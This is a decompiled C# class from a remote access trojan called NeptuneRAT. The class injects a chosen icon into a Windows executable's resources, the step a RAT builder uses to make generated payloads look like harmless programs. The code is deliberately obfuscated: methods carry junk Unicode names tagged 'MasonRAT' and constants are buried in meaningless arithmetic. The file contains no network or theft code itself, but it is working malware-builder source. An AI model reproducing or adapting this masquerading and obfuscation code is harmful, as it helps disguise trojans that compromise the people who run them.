// Decompiled with JetBrains decompiler
// Type: NeptuneRAT.IconInjector
// Assembly: NeptuneRAT Free Version V2, Version=2.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 48C579C5-C5A1-4244-9537-C19C9217B961
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Tools\NeptuneRAT\NeptuneRAT.7z\neptunerat.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;

#nullable disable
namespace NeptuneRAT;

public class IconInjector
{
  public static void \u2694️MasonRAT\u270C̍\u060F\u0609\u060A\u060D\u060Fــئ\u060Aى(
    string exeFileName,
    string iconFileName)
  {
    IconInjector.\u2694️MasonRAT\u270Cﻻـ\u0609ڙـ\u0609ۨـ\u060F\u060Fـٺ\u060Fْۨـى̍ـ(exeFileName, iconFileName, 1U, 1U);
  }

  public static void \u2694️MasonRAT\u270Cﻻـ\u0609ڙـ\u0609ۨـ\u060F\u060Fـٺ\u060Fْۨـى̍ـ(
    string exeFileName,
    string iconFileName,
    uint iconGroupID,
    uint iconBaseID)
  {
    IconInjector.IconFile iconFile = IconInjector.IconFile.FromFile(iconFileName);
    IntPtr hUpdate = IconInjector.NativeMethods.BeginUpdateResource(exeFileName, false);
    byte[] iconGroupData = iconFile.CreateIconGroupData(iconBaseID);
    IconInjector.NativeMethods.UpdateResource(hUpdate, new IntPtr((long) ((-944836694 - -307304460 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + ((1421864248 | 360292354) - 805303522 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0) + 0)), new IntPtr((long) iconGroupID), (short) 0, iconGroupData, iconGroupData.Length);
    int num = checked (iconFile.ImageCount - 1);
    int index = 0;
    while (index <= num)
    {
      byte[] data = iconFile.get_ImageData(index);
      IconInjector.NativeMethods.UpdateResource(hUpdate, new IntPtr((long) (-1696087879 - -622346058 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 + (788213275 + (445619187 >> 1140321080) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 << ((-85964915 ^ -1556651469) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0) ^ 0)), new IntPtr(checked ((long) iconBaseID + (long) index)), (short) 0, data, data.Length);
      checked { ++index; }
    }
    IconInjector.NativeMethods.EndUpdateResource(hUpdate, false);
  }

  [SuppressUnmanagedCodeSecurity]
  private class NativeMethods
  {
    [DllImport("kernel32")]
    public static extern IntPtr BeginUpdateResource(string fileName, [MarshalAs(UnmanagedType.Bool)] bool deleteExistingResources);

    [DllImport("kernel32")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool UpdateResource(
      IntPtr hUpdate,
      IntPtr type,
      IntPtr name,
      short language,
      [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] data,
      int dataSize);

    [DllImport("kernel32")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool EndUpdateResource(IntPtr hUpdate, [MarshalAs(UnmanagedType.Bool)] bool discard);
  }

  private struct ICONDIR
  {
    public ushort Reserved;
    public ushort Type;
    public ushort Count;
  }

  private struct ICONDIRENTRY
  {
    public byte Width;
    public byte Height;
    public byte ColorCount;
    public byte Reserved;
    public ushort Planes;
    public ushort BitCount;
    public int BytesInRes;
    public int ImageOffset;
  }

  private struct BITMAPINFOHEADER
  {
    public uint Size;
    public int Width;
    public int Height;
    public ushort Planes;
    public ushort BitCount;
    public uint Compression;
    public uint SizeImage;
    public int XPelsPerMeter;
    public int YPelsPerMeter;
    public uint ClrUsed;
    public uint ClrImportant;
  }

  [StructLayout(LayoutKind.Sequential, Pack = 2)]
  private struct GRPICONDIRENTRY
  {
    public byte Width;
    public byte Height;
    public byte ColorCount;
    public byte Reserved;
    public ushort Planes;
    public ushort BitCount;
    public int BytesInRes;
    public ushort ID;
  }

  private class IconFile
  {
    private IconInjector.ICONDIR iconDir;
    private IconInjector.ICONDIRENTRY[] iconEntry;
    private byte[][] iconImage;

    public int ImageCount => (int) this.iconDir.Count;

    public byte[] get_ImageData(int index) => this.iconImage[index];

    private IconFile() => this.iconDir = new IconInjector.ICONDIR();

    public static IconInjector.IconFile FromFile(string filename)
    {
      IconInjector.IconFile iconFile = new IconInjector.IconFile();
      byte[] src = File.ReadAllBytes(filename);
      GCHandle gcHandle = GCHandle.Alloc((object) src, (GCHandleType) ((562634015 - 889802895 % 1717936121 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ^ ~((1448235544 | 1490999907) - 1264494351 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0) + 0));
      iconFile.iconDir = (IconInjector.ICONDIR) Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), typeof (IconInjector.ICONDIR));
      iconFile.iconEntry = new IconInjector.ICONDIRENTRY[checked ((int) iconFile.iconDir.Count - 1 + 1)];
      iconFile.iconImage = new byte[checked ((int) iconFile.iconDir.Count - 1 + 1)][];
      int num1 = Marshal.SizeOf<IconInjector.ICONDIR>(iconFile.iconDir);
      Type type = typeof (IconInjector.ICONDIRENTRY);
      int num2 = Marshal.SizeOf(type);
      int num3 = checked ((int) iconFile.iconDir.Count - 1);
      int index = 0;
      while (index <= num3)
      {
        IconInjector.ICONDIRENTRY structure = (IconInjector.ICONDIRENTRY) Marshal.PtrToStructure(new IntPtr(checked (gcHandle.AddrOfPinnedObject().ToInt64() + (long) num1)), type);
        iconFile.iconEntry[index] = structure;
        iconFile.iconImage[index] = new byte[checked (structure.BytesInRes - 1 + 1)];
        Buffer.BlockCopy((Array) src, structure.ImageOffset, (Array) iconFile.iconImage[index], 0, structure.BytesInRes);
        checked { num1 += num2; }
        checked { ++index; }
      }
      gcHandle.Free();
      return iconFile;
    }

    public byte[] CreateIconGroupData(uint iconBaseID)
    {
      byte[] iconGroupData = new byte[checked (Marshal.SizeOf(typeof (IconInjector.ICONDIR)) + Marshal.SizeOf(typeof (IconInjector.GRPICONDIRENTRY)) * this.ImageCount - 1 + 1)];
      GCHandle gcHandle1 = GCHandle.Alloc((object) iconGroupData, (GCHandleType) ((-809501565 - -379793162 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ^ ~(2136654211 - 1706945810 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0) ^ 0));
      Marshal.StructureToPtr<IconInjector.ICONDIR>(this.iconDir, gcHandle1.AddrOfPinnedObject(), false);
      int num1 = Marshal.SizeOf<IconInjector.ICONDIR>(this.iconDir);
      int num2 = checked (this.ImageCount - 1);
      int index = 0;
      while (index <= num2)
      {
        IconInjector.GRPICONDIRENTRY structure = new IconInjector.GRPICONDIRENTRY();
        IconInjector.BITMAPINFOHEADER bitmapinfoheader = new IconInjector.BITMAPINFOHEADER();
        GCHandle gcHandle2 = GCHandle.Alloc((object) bitmapinfoheader, (GCHandleType) ((56712264 - -1284088763 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - (1883290017 + -1527998902 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 << (1466289286 > 1948457447 ? 1255496341 : 941622256) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0 + 0));
        Marshal.Copy(this.get_ImageData(index), 0, gcHandle2.AddrOfPinnedObject(), Marshal.SizeOf(typeof (IconInjector.BITMAPINFOHEADER)));
        gcHandle2.Free();
        structure.Width = this.iconEntry[index].Width;
        structure.Height = this.iconEntry[index].Height;
        structure.ColorCount = this.iconEntry[index].ColorCount;
        structure.Reserved = this.iconEntry[index].Reserved;
        structure.Planes = bitmapinfoheader.Planes;
        structure.BitCount = bitmapinfoheader.BitCount;
        structure.BytesInRes = this.iconEntry[index].BytesInRes;
        structure.ID = checked ((ushort) ((long) iconBaseID + (long) index));
        Marshal.StructureToPtr<IconInjector.GRPICONDIRENTRY>(structure, new IntPtr(checked (gcHandle1.AddrOfPinnedObject().ToInt64() + (long) num1)), false);
        checked { num1 += Marshal.SizeOf(typeof (IconInjector.GRPICONDIRENTRY)); }
        checked { ++index; }
      }
      gcHandle1.Free();
      return iconGroupData;
    }
  }
}
